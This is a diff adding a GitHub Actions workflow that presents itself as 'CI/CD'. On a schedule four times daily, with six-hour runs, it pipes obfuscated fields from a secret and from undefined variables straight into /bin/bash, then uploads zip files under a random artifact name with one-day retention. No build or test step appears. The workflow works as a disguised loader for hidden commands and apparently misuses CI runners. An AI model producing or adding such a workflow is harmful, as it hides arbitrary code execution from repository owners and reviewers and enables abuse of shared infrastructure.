@@ -1,0 +1,32 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          nwno1515: ${{ secrets.nwno1515 }}
+        run: |
+          printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
+          echo $kp2 | jq -r .efmw985 | /bin/bash
+          printf '%s' "$c5" | jq -r .jx639 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: XGiB4Swl
+          path: "*.zip"
+          retention-days: 1
